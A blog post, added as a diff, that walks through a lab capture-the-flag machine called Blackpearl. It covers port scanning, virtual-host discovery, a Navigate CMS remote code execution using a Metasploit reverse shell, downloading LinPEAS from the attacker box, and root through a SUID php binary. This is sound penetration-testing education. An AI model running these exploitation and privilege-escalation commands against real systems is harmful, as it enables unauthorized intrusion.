@@ -1,0 +1,419 @@
+---
+title: "Blackpearl Machine (TCM Security) — Step-by-Step Walkthrough"
+date: "2025-12-07"
+draft: false
+tags: ["linux, "virtual-host", "navigate-cms", "suid", "privilege-escalation", "linpeas"]
+summary: "Compromise of a Linux machine via DNS reconnaissance to discover a virtual host running Navigate CMS v2.8, exploited through an unauthenticated RCE vulnerability, followed by privilege escalation via a SUID misconfiguration on php7.3."
+images: ["/static/images/blackpearl/blackpearl.png"]
+---
+
+# Lab-Setup:
+
+
+![blackpearl](/static/images/blackpearl/image.png)
+
+Both the machines are configured on NAT Network.
+
+# Nmap Scan:
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -sCV  -T4 -p- 10.0.2.15
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-23 00:53 EDT
+Nmap scan report for 10.0.2.15
+Host is up (0.00068s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
+|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
+|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
+53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
+80/tcp open  http    nginx 1.14.2
+|_http-title: Welcome to nginx!
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:AF:9D:B3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.16 seconds
+```
+
+The host was confirmed to be **`alive and reachable`**, with minimal latency observed. Out of **`65,535 TCP ports`**, only **`three ports`** were found open, indicating a relatively small external attack surface.
+
+### **Identified Services**
+
+- **`Port 22/tcp — SSH`**
+- **`Port 53/tcp — DNS`**
+- **`Port 80/tcp — HTTP`**
+
+### **Host Information**
+
+- Operating System: Linux
+- MAC Address: `08:00:27:AF:9D:B3`
+- Virtualization: Oracle VirtualBox (virtual NIC detected)
+
+The target system exposes **`SSH, DNS, and HTTP services`**. While the number of open ports is limited, multiple services disclose version information, which can be leveraged for **`version-specific vulnerability research`**. Further enumeration of the web server and authentication mechanisms is recommended.
+
+# Web Enumeration:
+
+An **`nginx web server`** running on **`port 80`**. Accessing the service displayed the **`default nginx welcome page`.**
+
+![blackpearl](/static/images/blackpearl/image%201.png)
+
+## Directory busting
+
+I performed directory brute-forcing against the web server using **ffuf** with the `directory-list-2.3-medium.txt` wordlist.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ffuf -u http://10.0.2.15/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.15/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 11ms]
+# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 13ms]
+#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 13ms]
+                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 13ms]
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 14ms]
+# This work is licensed under the Creative Commons  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 39ms]
+# Copyright 2007 James Fisher [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 80ms]
+#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 82ms]
+# on atleast 2 different hosts [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 82ms]
+# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 82ms]
+# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 83ms]
+#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 83ms]
+# directory-list-2.3-medium.txt [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 93ms]
+# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 107ms]
+secret                  [Status: 200, Size: 209, Words: 31, Lines: 9, Duration: 42ms]
+                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 92ms]
+```
+
+The scan returned mostly false positives caused by the web server responding with identical content for non-existent paths. One valid directory was identified:
+
+- **`/secret** — HTTP 200`
+
+When I navigated to **`/secret`**, the server initiated a **`file download.`**
+
+![blackpearl](/static/images/blackpearl/image%202.png)
+
+No! exploitable web directories or application endpoints were identified through directory busting.
+
+Based on the result, I did **`DNS reconnaissance`**.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sudo dnsrecon -r 127.0.0.0/24 -n 10.0.2.15 -d blah
+[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
+[+] 	 PTR blackpearl.tcm 127.0.0.1
+[+] 1 Records Found
+```
+
+DNS reconnaissance revealed that the target IP resolves to the hostname **`blackpearl.tcm`**.
+
+I then added the domain mapping to my local hosts file, resolving **`blackpearl.tcm`** to the target IP address.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sudo nano /etc/hosts  
+```
+
+![blackpearl](/static/images/blackpearl/image%203.png)
+
+### **Web Enumeration (Virtual Host)**
+
+![blackpearl](/static/images/blackpearl/image%204.png)
+
+After updating the local hosts file, I accessed **`http://blackpearl.tcm`** and observed that the application served a **PHP-based web page**.
+
+- **PHP Version:** `7.3.27-1~deb10u1`
+
+### **Directory Fuzzing (Virtual Host)**
+
+I then again performed directory enumeration against **`http://blackpearl.tcm`** using **Gobuster** to confirm whether any hidden application paths were present.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://blackpearl.tcm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://blackpearl.tcm
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/navigate             (Status: 301) [Size: 185] [--> http://blackpearl.tcm/navigate/]
+Progress: 220560 / 220561 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+The scan identified a single accessible directory:
+
+- **`/navigate**` — HTTP 301 (redirects to `/navigate/`)
+
+Navigating to this path revealed that the web application is running a **`content management system (CMS)**.`
+
+![blackpearl](/static/images/blackpearl/image%205.png)
+
+### **Application Identification**
+
+The application was identified as:
+
+- **`Navigate CMS v2.8`**
+
+With the CMS and version confirmed, I conducted targeted vulnerability research. Public exploit research revealed the existence of a **`Metasploit proof-of-concept module`** for **`unauthorized remote code execution (RCE)`** affecting this version of Navigate CMS.
+
+[Rapid7](https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/)
+
+### **Exploitation — Navigate CMS v2.8**
+
+I loaded the following Metasploit module:
+
+- `exploit/multi/http/navigate_cms_rce`
+
+The exploit was configured to target the CMS installation located at **`/navigate/`** and to use the correct virtual host **`blackpearl.tcm`**.
+
+Once the required options were set, I executed the exploit. The module successfully bypassed authentication, uploaded a malicious payload, and triggered execution on the target system.
+
+Once the required options were set, I executed the exploit. The module successfully bypassed authentication, uploaded a malicious payload, and triggered execution on the target system.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ msfconsole  
+Metasploit tip: You can pivot connections over sessions started with the 
+ssh_login modules
+
+       =[ metasploit v6.4.64-dev                          ]
++ -- --=[ 2519 exploits - 1296 auxiliary - 431 post       ]
++ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use exploit/multi/http/navigate_cms_rce
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/navigate_cms_rce) > show targets 
+
+Exploit targets:
+=================
+
+    Id  Name
+    --  ----
+=>  0   Automatic
+
+msf6 exploit(multi/http/navigate_cms_rce) > show options 
+
+Module options (exploit/multi/http/navigate_cms_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
+   VHOST                       no        HTTP server virtual host
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.4         yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/navigate_cms_rce) > set rhosts 10.0.2.15
+rhosts => 10.0.2.15
+msf6 exploit(multi/http/navigate_cms_rce) > set VhOST blackpearl.tcm
+VhOST => blackpearl.tcm
+msf6 exploit(multi/http/navigate_cms_rce) > exploit 
+[*] Started reverse TCP handler on 10.0.2.4:4444 
+[+] Login bypass successful
+[+] Upload successful
+[*] Triggering payload...
+[*] Sending stage (40004 bytes) to 10.0.2.15
+[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.15:38626) at 2025-10-23 03:21:27 -0400
+
+meterpreter >
+```
+
+obtained a **`Meterpreter reverse shell**.`
+
+```bash
+meterpreter > shell
+Process 1175 created.
+Channel 1 created.
+whoami
+www-data
+```
+
+### **Initial Access Confirmation**
+
+After spawning a shell from the Meterpreter session, I verified the execution context:
+
+- **User:** `www-data`
+
+This confirmed that I had achieved **`remote code execution as the web server user`**, indicating successful initial foothold but with **limited privileges**.
+
+At this stage, privilege escalation was required to gain **`root-level access`** and retrieve the target flag.
+
+### Spawning a TTY shell
+
+```bash
+which python
+/usr/bin/python
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@blackpearl:~/blackpearl.tcm/navigate$ 
+```
+
+This resulted in a stable interactive shell as **`www-data`**, enabling reliable execution of enumeration and privilege escalation techniques.
+
+### **Privilege Escalation**
+
+After gaining an initial foothold as **`www-data`**, I proceeded with local privilege escalation enumeration using **`LinPEAS`**.
+
+I hosted the LinPEAS script on my attacking machine and transferred it to the target:
+
+```bash
+┌──(kali㉿kali)-[~/HTB]
+└─$ python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.0.2.15 - - [07/Dec/2025 08:58:07] "GET /linpeas.sh HTTP/1.1" 200 -
+
+```
+
+On the target system, I downloaded the script to `/tmp`:
+
+```bash
+www-data@blackpearl:/tmp$ wget http://10.0.2.4/linpeas.sh
+wget http://10.0.2.4/linpeas.sh
+--2025-12-07 08:58:07--  http://10.0.2.4/linpeas.sh
+Connecting to 10.0.2.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 971926 (949K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+linpeas.sh          100%[===================>] 949.15K  --.-KB/s    in 0.1s    
+
+2025-12-07 08:58:07 (6.52 MB/s) - 'linpeas.sh' saved [971926/971926]
+
+www-data@blackpearl:/tmp$ ls
+ls
+linpeas.sh
+systemd-private-9f32e185bbab470d8a9c9492d9e44d2a-systemd-timesyncd.service-LT22NT
+www-data@blackpearl:/tmp$ 
+```
+
+With the script successfully transferred, I executed LinPEAS to identify potential privilege escalation vectors.
+
+### **SUID Enumeration**
+
+LinPEAS revealed the presence of multiple **SUID binaries**. To validate this, I manually enumerated SUID files:
+
+![blackpearl](/static/images/blackpearl/image%206.png)
+
+```bash
+www-data@blackpearl:/tmp$ find / -type f -perm -4000 2>/dev/null
+find / -type f -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/php7.3
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/gpasswd
+www-data@blackpearl:/tmp$ 
+```
+
+Notable SUID binaries included:
+
+- `/usr/bin/php7.3`
+- `/usr/bin/su`
+- `/usr/bin/passwd`
+- `/usr/bin/mount`
+- `/usr/bin/umount`
+
+The presence of **`php7.3` with the SUID bit set** stood out as a high-risk misconfiguration.
+
+### **SUID Abuse via PHP**
+
+I researched the identified SUID binaries on **`GTFOBins`** and confirmed that **`PHP`** can be abused to spawn a shell while preserving elevated privileges.
+
+![blackpearl](/static/images/blackpearl/image%207.png)
+
+I executed the following command to spawn a privileged shell:
+
+```bash
+www-data@blackpearl:/tmp$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+```
+
+- Effective UID (euid): root
+- Real UID: www-data
+
+This indicated successful privilege escalation, allowing access to **root-owned files and directories**.
+
+### **Root Access & Flag Retrieval**
+
+With root privileges effectively obtained, I accessed the root directory and retrieved the flag:
+
+```bash
+# cd /root	
+cd /root
+# ls    
+ls
+flag.txt
+# cat flag.txt
+cat flag.txt
+Good job on this one.
+Finding the domain name may have been a little guessy,
+but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
+# 
+```
+
+Blackpearl successfully rooted 😎
